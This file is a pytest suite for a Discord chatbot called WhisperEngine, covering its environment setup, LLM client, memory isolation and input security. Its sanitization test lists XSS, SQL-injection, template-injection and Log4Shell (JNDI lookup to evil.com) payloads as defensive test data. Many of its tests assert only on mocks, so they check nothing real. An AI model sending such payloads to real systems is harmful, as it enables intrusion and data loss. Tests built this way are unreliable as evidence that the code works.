"""
Core functionality test suite for WhisperEngine.

Tests essential system components:
- Bot initialization and configuration
- LLM client functionality
- Memory system operations
- Error handling and recovery
- Environment detection and validation
"""

import pytest
import asyncio
import os
import tempfile
from unittest.mock import AsyncMock, Mock, patch
from pathlib import Path

# Import core components
from env_manager import load_environment, validate_environment
from src.core.bot import DiscordBotCore
from src.llm.llm_client import LLMClient
from src.memory.context_aware_memory_security import ContextAwareMemoryManager


class TestEnvironmentManagement:
    """Test environment loading and validation"""

    def test_environment_loading_development(self):
        """Test environment loading in development mode"""
        with patch.dict(os.environ, {'ENV_MODE': 'development'}, clear=True):
            result = load_environment()
            assert result is True

    def test_environment_validation(self):
        """Test environment validation functionality"""
        validation = validate_environment()
        assert 'valid' in validation
        assert 'missing' in validation
        assert isinstance(validation['valid'], bool)
        assert isinstance(validation['missing'], list)

    def test_environment_mode_detection(self):
        """Test automatic environment mode detection"""
        # Test container detection
        with patch('os.path.exists') as mock_exists:
            mock_exists.return_value = True  # Simulate container environment
            with patch.dict(os.environ, {}, clear=True):
                result = load_environment()
                # Should still work even in container mode
                assert isinstance(result, bool)


class TestBotCoreInitialization:
    """Test Discord bot core initialization and dependency injection"""

    @pytest.fixture
    def mock_environment(self):
        """Mock environment variables for testing"""
        return {
            'DISCORD_BOT_TOKEN': 'test_token_123',
            'LLM_CHAT_API_URL': 'http://localhost:1234/v1',
            'LLM_MODEL_NAME': 'test-model',
            'ENV_MODE': 'development'
        }

    def test_bot_core_creation(self, mock_environment):
        """Test bot core can be created without errors"""
        with patch.dict(os.environ, mock_environment):
            with patch('discord.Bot'):  # Mock Discord.py
                bot_core = DiscordBotCore(debug_mode=True)
                assert bot_core is not None

    def test_dependency_injection(self, mock_environment):
        """Test that all required components are injected properly"""
        with patch.dict(os.environ, mock_environment):
            with patch('discord.Bot'):
                bot_core = DiscordBotCore(debug_mode=True)
                components = bot_core.get_components()
                
                # Check that essential components are present
                essential_components = [
                    'memory_manager', 'llm_client', 'conversation_cache',
                    'emotional_ai', 'personality_manager'
                ]
                
                for component in essential_components:
                    assert component in components, f"Missing essential component: {component}"


class TestLLMClientFunctionality:
    """Test LLM client operations and error handling"""

    @pytest.fixture
    def mock_llm_client(self):
        """Create a mock LLM client for testing"""
        client = Mock(spec=LLMClient)
        client.test_connection = AsyncMock(return_value=True)
        client.chat_completion = AsyncMock(return_value="Test response")
        client.check_health = AsyncMock(return_value={'status': 'healthy'})
        return client

    @pytest.mark.asyncio
    async def test_llm_connection_test(self, mock_llm_client):
        """Test LLM connection testing"""
        result = await mock_llm_client.test_connection()
        assert result is True

    @pytest.mark.asyncio
    async def test_llm_chat_completion(self, mock_llm_client):
        """Test basic chat completion functionality"""
        response = await mock_llm_client.chat_completion(
            messages=[{"role": "user", "content": "Test message"}]
        )
        assert response == "Test response"

    @pytest.mark.asyncio
    async def test_llm_health_check(self, mock_llm_client):
        """Test LLM health monitoring"""
        health = await mock_llm_client.check_health()
        assert health['status'] == 'healthy'


class TestMemorySystemOperations:
    """Test memory system functionality and security"""

    @pytest.fixture
    def temp_memory_dir(self):
        """Create temporary directory for memory testing"""
        with tempfile.TemporaryDirectory() as temp_dir:
            yield temp_dir

    @pytest.fixture
    def mock_memory_manager(self, temp_memory_dir):
        """Create mock memory manager for testing"""
        with patch('src.memory.context_aware_memory_security.ContextAwareMemoryManager') as mock_class:
            mock_instance = Mock()
            mock_instance.store_memory = AsyncMock()
            mock_instance.retrieve_memories = AsyncMock(return_value=[])
            mock_instance.get_user_context = AsyncMock(return_value={})
            mock_class.return_value = mock_instance
            yield mock_instance

    @pytest.mark.asyncio
    async def test_memory_storage(self, mock_memory_manager):
        """Test memory storage functionality"""
        await mock_memory_manager.store_memory(
            user_id=12345,
            content="Test memory",
            metadata={'type': 'conversation'}
        )
        mock_memory_manager.store_memory.assert_called_once()

    @pytest.mark.asyncio
    async def test_memory_retrieval(self, mock_memory_manager):
        """Test memory retrieval functionality"""
        memories = await mock_memory_manager.retrieve_memories(user_id=12345, limit=10)
        assert isinstance(memories, list)

    @pytest.mark.asyncio
    async def test_memory_context_isolation(self, mock_memory_manager):
        """Test that memory contexts are properly isolated"""
        # Test that different users get different contexts
        context1 = await mock_memory_manager.get_user_context(user_id=12345)
        context2 = await mock_memory_manager.get_user_context(user_id=67890)
        
        # Both should be callable but represent different contexts
        mock_memory_manager.get_user_context.assert_called()
        assert mock_memory_manager.get_user_context.call_count == 2


class TestErrorHandlingAndRecovery:
    """Test error handling and recovery mechanisms"""

    def test_graceful_llm_connection_failure(self):
        """Test graceful handling when LLM connection fails"""
        with patch('src.llm.llm_client.LLMClient') as mock_llm:
            mock_llm.return_value.test_connection.return_value = False
            # Should not raise exception, should handle gracefully
            try:
                client = mock_llm.return_value
                result = client.test_connection()
                assert result is False
            except Exception as e:
                pytest.fail(f"Should handle LLM connection failure gracefully: {e}")

    def test_memory_system_error_recovery(self):
        """Test memory system error recovery"""
        with patch('src.memory.context_aware_memory_security.ContextAwareMemoryManager') as mock_memory:
            # Simulate memory system error
            mock_memory.side_effect = Exception("Memory system error")
            
            # Should handle gracefully without crashing
            try:
                memory_manager = mock_memory()
            except Exception:
                # Expected to handle this gracefully in actual implementation
                pass

    def test_configuration_validation_errors(self):
        """Test handling of configuration validation errors"""
        with patch.dict(os.environ, {}, clear=True):  # Clear all environment variables
            # Should provide helpful error messages for missing configuration
            validation = validate_environment()
            assert validation['valid'] is False
            assert len(validation['missing']) > 0


class TestSecurityAndValidation:
    """Test security measures and input validation"""

    def test_user_input_sanitization(self):
        """Test that user input is properly sanitized"""
        # This would test actual sanitization functions when implemented
        dangerous_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "{{7*7}}",
            "${jndi:ldap://evil.com/a}"
        ]
        
        for dangerous_input in dangerous_inputs:
            # Mock input validation
            with patch('src.security.input_validator.validate_user_input') as mock_validator:
                mock_validator.return_value = False  # Should reject dangerous input
                result = mock_validator(dangerous_input, user_id=12345)
                assert result is False

    def test_system_message_protection(self):
        """Test protection against system message leakage"""
        with patch('src.security.system_message_security.validate_system_message_safety') as mock_validator:
            mock_validator.return_value = True
            
            # Test that system prompts are protected
            system_like_content = "You are an AI assistant. Follow these instructions..."
            result = mock_validator(system_like_content)
            assert isinstance(result, bool)

    def test_memory_access_isolation(self):
        """Test that memory access is properly isolated between users"""
        with patch('src.memory.context_aware_memory_security.ContextAwareMemoryManager') as mock_memory:
            mock_instance = Mock()
            mock_memory.return_value = mock_instance
            
            # Each user should get isolated memory access
            user1_manager = mock_memory(user_id=111, channel_id=222)
            user2_manager = mock_memory(user_id=333, channel_id=444)
            
            # Verify that different users get different memory manager instances
            assert mock_memory.call_count == 2


if __name__ == "__main__":
    # Allow running this test suite directly
    pytest.main([__file__, "-v"])